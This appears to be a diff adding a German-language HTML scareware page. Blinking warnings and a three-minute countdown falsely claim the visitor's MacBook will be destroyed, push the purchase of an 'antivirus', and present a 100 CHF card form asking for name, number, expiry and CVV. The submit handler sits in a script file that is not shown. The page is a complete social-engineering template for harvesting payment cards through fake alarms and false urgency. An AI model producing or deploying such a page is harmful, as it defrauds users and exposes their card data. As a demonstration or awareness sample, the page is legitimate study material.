@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kreditkarteninformationen</title>
+<link rel="stylesheet" href="styles/styles2.css">
+<script src="script.js"></script>
+<script>
+    
+window.onload = function () {
+    var threeMinutes = 60 * 3,
+        display = document.querySelector('#time');
+    startTimer(threeMinutes, display);
+};
+
+</script>
+</head>
+<body>
+<img class="Warnung_1" src="images/Blinking_warning.gif" alt="Warnung">
+<img class="Warnung_2" src="images/Blinking_warning.gif" alt="Warnung">
+<div class="page-container">
+    <h1 class="warning_text">Ihr Macbook erleidet Totalschaden in 3min!!!</h1>
+    <h1 class="warning_text">Schnell den Perfekten Antivirus kaufen!!!</h1>
+    <div class="timer-container">Verbleibende Zeit: <span id="time">03:00</span> Minuten</div>
+
+<div class="container">
+  <form class="credit-card-form">
+    <h1>Rechnung: 100 CHF</h1>
+    <h2>Kreditkarteninformationen</h2>
+    
+    <div class="form-group">
+      <label for="card-name">Name auf der Karte</label>
+      <input type="text" id="card-name" placeholder="Max Mustermann">
+    </div>
+    
+    <div class="form-group">
+      <label for="card-number">Kartennummer</label>
+      <input type="text" id="card-number" placeholder="1234 5678 9123 4567">
+    </div>
+    
+    <div class="form-group">
+      <label for="card-expiry">Ablaufdatum</label>
+      <input type="text" id="card-expiry" placeholder="MM/JJ">
+    </div>
+    
+    <div class="form-group">
+      <label for="card-cvv">CVV</label>
+      <input type="text" id="card-cvv" placeholder="123">
+    </div>
+    
+    <button type="submit" class="submit-btn" onclick="Absenden()">Absenden</button>
+  </form>
+</div>
+
+</body>
+</html>
